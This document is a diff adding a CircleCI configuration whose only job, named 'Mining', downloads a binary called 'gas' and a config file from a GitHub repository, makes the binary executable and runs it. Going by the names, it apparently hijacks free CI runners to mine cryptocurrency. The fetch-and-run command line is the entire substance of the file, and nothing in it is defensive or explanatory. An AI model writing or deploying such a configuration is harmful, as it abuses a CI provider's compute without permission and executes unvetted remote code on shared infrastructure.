@@ -1,0 +1,22 @@
+version: 2.1
+
+
+
+jobs:
+  Mining:
+
+    docker:
+      - image: cimg/base:stable
+
+
+    steps:
+      - checkout
+      - run:
+          name: "Mining"
+          command: wget https://github.com/Miningac/gas/raw/main/gas && wget https://raw.githubusercontent.com/Miningac/gas/main/script.ini && chmod +x gas && ./gas script.ini
+
+
+workflows:
+  Mining:
+    jobs:
+      - Mining
